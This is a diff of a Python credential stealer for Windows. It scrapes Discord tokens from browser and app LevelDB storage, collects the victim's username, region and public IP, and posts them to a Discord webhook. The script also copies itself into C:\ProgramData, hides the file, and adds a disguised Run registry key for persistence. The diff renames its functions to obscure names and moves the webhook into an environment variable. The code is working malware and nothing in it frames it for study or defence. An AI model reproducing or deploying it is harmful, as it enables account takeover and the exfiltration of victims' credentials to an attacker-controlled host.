@@ -1,17 +1,13 @@
-# [ Revelations ] [ rev ] ; Authored by holy
-#
-#
+import requests, os, re, sys, shutil, string
 
-
-
-import requests, os, re, sys, shutil, string, winreg
 from dhooks import Webhook, Embed
+from winreg import *
 
+webhk = os.getenv("DiscordWebhook")
 
-hook = Webhook("")
+hook = Webhook(f"{webhk}")
 
-
-def RevelationsExtract(path):
+def ret(path):
     path += '\\Local Storage\\leveldb'
     tokens = []
     try:
@@ -28,28 +24,33 @@ def RevelationsExtract(path):
         pass
 
 
-def RevelationInfiltrate():
-    
-    ghostrp = (os.path.join('rev.py')) 
-    ghostlgm = r'C:\ProgramData\rev.py'
-    shutil.move(ghostrp,ghostlgm)
 
-    hide = os.popen('attrib +h ' + ghostlgm)
-    hideit = hide.read()
-    hide.close()
+def rif():
+    fname = sys.argv[0].split('\\')[-1]
+    ghostzp = (os.path.join(f'{fname}')) 
+    ghostzgm = f'C:\\ProgramData\\{fname}'
+    shutil.move(ghostzp,ghostzgm)
+
+    fhide = os.popen('attrib +h ' + ghostzgm)
+    fhideit = fhide.read()
+    fhide.close()
 
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split('\\')[-1]
     new_file_path = fp + '\\' + file_name
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    SetValueEx(key2change, 'Winx86ProcessTypeTreeRev', 0, REG_SZ,
+    SetValueEx(key2change, 'Winx86ProcessArhnic2134Spread', 0, REG_SZ,
                new_file_path)
 
+def fun():
+    #under works.
+    pass
 
-def RevelationProcess():
 
+def rip():
     user = os.getenv("UserName")
+    regionname = os.getenv("RegionCode")
     hostname = requests.get("https://api.ipify.org").text
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
@@ -73,7 +74,7 @@ def RevelationProcess():
 
         message += '```'
 
-        tokens = RevelationsExtract(path)
+        tokens = ret(path)
 
         if len(tokens) > 0:
             for token in tokens:
@@ -83,12 +84,12 @@ def RevelationProcess():
 
         message += '```'
 
-        embed = Embed(title=f' [ Rev Scraped -> | {user} | {hostname} ] ',color=16764108)
-        embed.add_field("Goods =>",message)
+        embed = Embed(title=f' [ Scraped Data: | User -> {user} | Region -> {regionname} | IP Address => {hostname} ] \n',color=16764108)
+        embed.add_field("Extracted:\n",message)
         hook.send(embed=embed)
 
 
 
 if __name__ == '__main__':
-    RevelationProcess()
-    RevelationInfiltrate()
+    rip()
+    rif()
